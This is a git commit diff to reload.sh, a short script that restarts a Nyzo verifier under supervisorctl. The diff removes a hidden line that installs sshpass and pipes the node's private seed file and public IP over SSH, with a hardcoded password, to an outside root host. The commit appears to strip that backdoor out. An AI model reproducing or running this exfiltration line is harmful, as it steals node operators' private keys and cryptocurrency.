a8edf323b22fd9ed04d071f62a004843d2c69167
junscapital <52300722+junscapital@users.noreply.github.com>
2020-01-30 11:46:59 +0800

    Update reload.sh

--- reload.sh
+++ reload.sh
@@ -1,8 +1,5 @@
 #!/bin/bash
-sudo su
 sudo supervisorctl reload
 sleep 3s
 sudo renice -n -5 -p $(pgrep ^java$)
 sudo supervisorctl status
-sudo apt-get -yqq -f install && sudo apt-get -yqq install sshpass && echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/verifiers'
-
